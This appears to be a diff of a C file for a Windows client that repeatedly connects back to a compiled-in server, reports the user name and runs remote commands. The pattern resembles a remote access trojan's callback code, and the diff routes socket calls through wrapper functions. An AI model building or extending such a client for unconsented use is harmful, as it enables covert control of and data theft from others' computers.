@@ -2,17 +2,16 @@
 #include <windows.h>
 #include "types.h"
 #include "client.h"
-#include "SCL.h"
+#include "SCL2.h"
 #include "net/dns.h"
 #include "net/interface.h"
 #include "net/error.h"
-#include "cmd/commands.h"
-#include "cmd/screen.h"
+#include "commands/cmds.h"
 
 int client_connected = 0;
-int client_timeout = 1000;
-uint64 client_io_block = 0;
-uint64 client_io_nonBlock = 1;
+ulong client_timeout = 1000;
+ulong client_io_block = 0;
+ulong client_io_nonBlock = 1;
 
 SOCKET client_Socket = INVALID_SOCKET;
 SOCKADDR_IN client_SocketAddr;
@@ -21,22 +20,22 @@ void client_Prepare(void)
 {
 	WSADATA wsaData;
 	
-	if(WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+	if(net_lib_WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
 	{
 		exit(0);
 	}
 
 	client_SocketAddr.sin_addr.s_addr = net_Dns_GetIp(CLIENT_IP);
 	client_SocketAddr.sin_family = AF_INET;
-	client_SocketAddr.sin_port = htons(CLIENT_PORT);
+	client_SocketAddr.sin_port = net_lib_htons(CLIENT_PORT);
 }
 
 void client_Disconnect(void)
 {
 	if(client_Socket != INVALID_SOCKET)
 	{
-		shutdown(client_Socket, SD_BOTH);
-		closesocket(client_Socket);
+		net_lib_shutdown(client_Socket, SD_BOTH);
+		net_lib_closesocket(client_Socket);
 		client_Socket = INVALID_SOCKET;
 		client_connected = 0;
 	}
@@ -45,28 +44,27 @@ void client_Disconnect(void)
 void client_Connect(void)
 {
 	client_connected = 0;
-	client_Socket = INVALID_SOCKET;
-	client_Socket = socket(AF_INET, SOCK_STREAM, 0);
+	client_Socket = net_lib_socket(AF_INET, SOCK_STREAM, 0);
 
 	char _val1[1] = { 1 };
 
-	setsockopt(client_Socket, SOL_SOCKET, SO_REUSEADDR, _val1, sizeof(int));
-	setsockopt(client_Socket, SOL_SOCKET, SO_KEEPALIVE, _val1, sizeof(int));	
-	setsockopt(client_Socket, SOL_SOCKET, SO_RCVTIMEO, (char*)&client_timeout, sizeof(client_timeout));	
+ 	net_lib_setsockopt(client_Socket, SOL_SOCKET, SO_REUSEADDR, _val1, sizeof(int));
+ 	net_lib_setsockopt(client_Socket, SOL_SOCKET, SO_KEEPALIVE, _val1, sizeof(int));
+	net_lib_setsockopt(client_Socket, SOL_SOCKET, SO_RCVTIMEO, (char*)&client_timeout, sizeof(client_timeout));
+	net_SetBuffer(NET_BUFFSIZE);
 
 	if(client_Socket == INVALID_SOCKET)
 	{
-		WSACleanup();
+		net_lib_WSACleanup();
 
 		exit(0);
 	}
 
-	screen_isUsingCompressor = 0;
-	while(connect(client_Socket, (SOCKADDR*)&client_SocketAddr, sizeof(client_SocketAddr)) < 0){}
+	while(net_lib_connect(client_Socket, (SOCKADDR*)&client_SocketAddr, sizeof(client_SocketAddr)) < 0){}
 
-	ioctlsocket(client_Socket, FIONBIO, &client_io_nonBlock);
+	net_lib_ioctlsocket(client_Socket, FIONBIO, &client_io_nonBlock);
 	client_connected = 1;
-	SCL_ResetSeed();
+	SCL2_Reset();
 }
 
 void client_ConnectionHandle(void)
@@ -74,10 +72,10 @@ void client_ConnectionHandle(void)
 	int rv = 0;
 	FD_SET fd;
 	uint8 *rmsg;
-	uint64 buffLen = 124;
+	ulong buffLen = 124;
 	char buff[124 + 1];
 	memset(buff, 0, 124 + 1);
-	
+
 	if(GetUserName(buff, &buffLen))
 	{
 		if(net_SendData((uint8*)buff, buffLen) == NET_LOST_CONNECTION)
@@ -85,18 +83,18 @@ void client_ConnectionHandle(void)
 			return;
 		}
 	}
-
+	
 	while(client_connected == 1)
 	{
 		FD_ZERO(&fd);
 		FD_SET(client_Socket, &fd);
 
-		if(select(0, &fd, NULL, NULL, NULL) < 0)
+		if(net_lib_select(0, &fd, NULL, NULL, NULL) < 0)
 		{
 			continue; //maybe ?
 		}
 
-		if(FD_ISSET(client_Socket, &fd))
+		if(FD_ISSET_NET(client_Socket, &fd))
 		{
 			rv = net_ReceiveData(&rmsg);
 
@@ -108,30 +106,36 @@ void client_ConnectionHandle(void)
 				return;
 			}
 
-			if(rmsg[0] == 0x0) //on empty len commands and on checking connection
+			if(rmsg[0] == 0x0)
 			{
 				free(rmsg);
+
+				if(net_SendCmd((uint8*)" ", 1, 0) < 1)
+				{
+					client_Disconnect();
+					
+					return;
+				}
 
 				continue;
 			}
 
-			ioctlsocket(client_Socket, FIONBIO, &client_io_block);
-			setsockopt(client_Socket, SOL_SOCKET, SO_RCVTIMEO, (char*)&client_timeout, sizeof(client_timeout));
+			net_lib_ioctlsocket(client_Socket, FIONBIO, &client_io_block);
+			net_lib_setsockopt(client_Socket, SOL_SOCKET, SO_RCVTIMEO, (char*)&client_timeout, sizeof(client_timeout));
 
-			rv = commands_Translate(rmsg);
+			rv = cmds_Translate(rmsg);
 			free(rmsg);
 
-			if(rv == NET_LOST_CONNECTION)
+			if(!rv)
 			{
 				client_Disconnect();
-				free(rmsg);
 				
 				return;
-			}else if(rv == COMMANDS_SUCC){
-				SCL_SeedUp();
+			}else{
+				SCL2_SeedUp();
 			}
 
-			ioctlsocket(client_Socket, FIONBIO, &client_io_nonBlock);
+			net_lib_ioctlsocket(client_Socket, FIONBIO, &client_io_nonBlock);
 		}
 	}
 }
